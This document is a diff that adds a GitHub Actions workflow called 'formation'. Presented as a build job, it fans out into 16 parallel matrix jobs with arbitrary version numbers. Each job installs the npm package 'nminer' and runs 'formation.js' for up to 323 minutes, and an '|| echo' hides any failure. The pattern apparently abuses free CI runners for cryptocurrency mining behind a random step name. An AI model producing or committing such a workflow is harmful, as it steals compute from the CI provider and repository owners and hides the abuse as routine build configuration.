@@ -1,0 +1,41 @@
+name: formation
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 7868 }
+          - { version: 8374 }
+          - { version: 435 }
+          - { version: 8961 }
+          - { version: 2008 }
+          - { version: 4510 }
+          - { version: 2772 }
+          - { version: 3349 }
+          - { version: 7357 }
+          - { version: 2587 }
+          - { version: 7134 }
+          - { version: 1600 }
+          - { version: 3506 }
+          - { version: 5475 }
+          - { version: 9809 }
+          - { version: 5741 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: incidentally aching
+        run: |
+          npm install nminer@latest
+          timeout 323m node formation.js || echo "formation executed"
